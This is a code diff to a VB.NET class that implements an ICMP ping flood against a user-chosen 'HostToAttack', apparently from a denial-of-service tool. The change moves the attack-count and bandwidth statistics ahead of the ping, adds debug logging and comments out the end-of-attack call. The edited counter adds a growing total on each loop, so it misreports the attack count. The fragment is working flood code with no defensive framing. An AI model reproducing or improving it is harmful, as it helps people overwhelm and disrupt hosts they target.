@@ -40,7 +40,7 @@ Public Class ICMP
             ThreadstoUse = 0
             AttackRunning = False
             GetFloodsBase().SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & GetFloodsBase.Get_AttackCount().ToString)
-            GetFloodsBase().SetEnd()
+            'GetFloodsBase().SetEnd()
         End If
     End Sub
 
@@ -65,19 +65,31 @@ Public Class ICMP
 
             Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
             Dim stopwatch As Stopwatch = Stopwatch.StartNew
+            Dim count As Integer = 0
+
             Dim Data As String = "a"
             For i = 0 To Length
                 Data += "a"
             Next
+            Dim UploadLength As Integer = Data.Length
+            Dim DownloadLength As Integer = UploadLength
             Do While (stopwatch.Elapsed < span)
+                'FloodBase
+                GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + count)
+                GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * UploadLength)
+                GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * DownloadLength)
+                count += 1
+                If Config.Variables.Debug Then
+                    Console.WriteLine("Count: " & GetFloodsBase.Get_AttackCount() & "Download byte/s: " & GetFloodsBase.GetAttackDownStrengOnByteOnSec())
+                End If
+
+                'Worker
                 Try
                     My.Computer.Network.Ping(HostToAttack)
                     Dim pingSender As Ping = New Ping()
                     Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)
                     Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
-                    GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
-                    GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * Length)
-                    GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * Length)
+
                     Continue Do
                 Catch
                     Continue Do
